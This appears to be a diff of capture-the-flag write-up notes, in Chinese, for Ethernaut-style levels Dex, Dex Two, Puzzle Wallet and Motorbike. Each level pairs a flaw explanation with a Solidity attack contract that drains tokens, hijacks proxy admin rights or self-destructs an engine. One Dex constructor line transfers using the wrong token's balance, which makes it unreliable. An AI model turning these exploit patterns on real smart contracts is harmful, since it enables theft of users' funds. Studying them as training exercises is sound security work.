@@ -367,3 +367,174 @@ contract Hack {
     }
 }
 ```
+
+## 23. Dex
+
+Dex合约的getSwapPrice函数计算Token价格有误, 可以通过来回交换代币来消耗dex合约的代币
+
+```solidity
+contract Hack {
+    Dex d = Dex(0x198687D61b5c42c820c5C411bD2d6D6b9d8D0556);
+    address[2] tokens = [d.token1(), d.token2()];
+    constructor() {
+        // 转移代币到hack合约
+        SwappableToken(tokens[0]).approve(msg.sender, address(this), type(uint256).max);
+        SwappableToken(tokens[1]).approve(msg.sender, address(this), type(uint256).max);
+        IERC20(tokens[0]).transferFrom(msg.sender, address(this), IERC20(tokens[0]).balanceOf(msg.sender));
+        IERC20(tokens[1]).transferFrom(msg.sender, address(this), IERC20(tokens[0]).balanceOf(msg.sender));
+        d.approve(address(d), type(uint256).max);
+    }
+    function hack() public {
+        uint256[2] memory hackBalances;
+        uint256[2] memory dexBalances;
+        uint fromIndex = 0;
+        uint toIndex = 1;
+        while (true) {
+            hackBalances = [SwappableToken(tokens[fromIndex]).balanceOf(address(this)),
+                                    SwappableToken(tokens[toIndex]).balanceOf(address(this))];
+
+            dexBalances = [SwappableToken(tokens[fromIndex]).balanceOf(address(d)),
+                                    SwappableToken(tokens[toIndex]).balanceOf(address(d))];
+
+            uint256 swapAmount = d.getSwapPrice(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
+            if (swapAmount > dexBalances[toIndex]) {
+                d.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
+                break;
+            } else {
+                d.swap(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
+            }
+            fromIndex = 1 - fromIndex;
+            toIndex = 1 - toIndex;
+        }
+    }
+}
+```
+
+## 24. Dex Two
+
+swap函数没有限制from和to的代币地址, 可以伪造代币, 操纵swap价格
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.10;
+
+interface DexTwo {
+    function token1() external view returns (address);
+
+    function token2() external view returns (address);
+
+    function swap(address from, address to, uint256 amount) external;
+}
+
+contract Hack {
+    DexTwo d = DexTwo(0x297F9e9F984136357A772386Cb0c37923f0a24cf);
+
+    function balanceOf(address) public view returns (uint256){
+        return 1;
+    }
+
+    function transferFrom(address from, address to, uint amount) public returns (bool) {
+        return true;
+    }
+
+    function attack() external {
+        d.swap(address(this), d.token1(), 1);
+        d.swap(address(this), d.token2(), 1);
+    }
+}
+
+```
+
+## 25. Puzzle Wallet
+
+pendingAdmin和owner在同一个slot, 可以先调用proposeNewAdmin函数, 获得owner权限
+再添加自己为白名单, 获得deposit权限
+multicall函数可以重入, 利用这一点通过multicall函数调用一次deposit和multicall函数(参数也是deposit)来提取资金
+最后通过setMaxBalance函数设置admin
+
+```solidity
+interface PuzzleWallet {
+    function balances(address addr) external view returns (uint256);
+
+    function admin() external view returns (address);
+
+    function pendingAdmin() external view returns (address);
+
+    function maxBalance() external view returns (address);
+
+    function owner() external view returns (address);
+
+    function proposeNewAdmin(address _newAdmin) external;
+
+    function addToWhitelist(address addr) external;
+
+    function setMaxBalance(uint256 _maxBalance) external;
+
+    function multicall(bytes[] calldata data) external payable;
+
+    function execute(address to, uint256 value, bytes calldata data) external payable;
+}
+
+contract Hack {
+    PuzzleWallet d = PuzzleWallet(0x03d610c7078E46c2995b9C254e09a2F6EbA32e25);
+
+    constructor() payable {
+        // 获取权限
+        d.proposeNewAdmin(address(this));
+        d.addToWhitelist(address(this));
+        // 重入调用存入金额
+        bytes memory deposit_call = abi.encodeWithSignature("deposit()");
+        bytes[] memory data = new bytes[](2);
+        data[0] = deposit_call;
+        bytes[] memory dc = new bytes[](1);
+        dc[0] = abi.encodeWithSignature("deposit()");
+        data[1] = abi.encodeWithSignature("multicall(bytes[])", dc);
+        d.multicall{value: msg.value}(data);
+        // 提取金额, maxBalance变为0
+        d.execute(address(this), d.balances(address(this)), bytes(""));
+        // 设置maxBalance变相覆盖admin值
+        d.setMaxBalance(uint256(uint160(address(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f))));
+        selfdestruct(payable(msg.sender));
+    }
+
+    receive() external payable {}
+}
+```
+
+## 26. Motorbike
+
+MotorBike合约的storage已经有initialize的标记, 无法再次调用initialize函数, 但engine合约的storage部分没有,
+通过查询MotorBike合约slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc的值,
+获取engine代码合约的地址为 0xbeeb399F0F7A7d68Bc821297AdEf84e813Ed1A09
+再调用engine合约的initialize函数获取upgrader权限
+之后通过upgradeToAndCall函数, 传入hack合约并执行initialize函数销毁自身
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.10;
+
+interface Engine {
+    function upgrader() external view returns (address);
+
+    function initialize() external;
+
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+}
+
+contract Hack {
+    function initialize() external {
+        selfdestruct(payable(msg.sender));
+    }
+}
+
+contract Hack1 {
+    constructor() {
+        Engine e = Engine(0xbeeb399F0F7A7d68Bc821297AdEf84e813Ed1A09);
+        e.initialize();
+        // 传入Hack合约地址
+        e.upgradeToAndCall(0xD53542c0ea17f70A8035fb14b319f35Bf475208f, abi.encodeWithSignature("initialize()"));
+    }
+}
+```
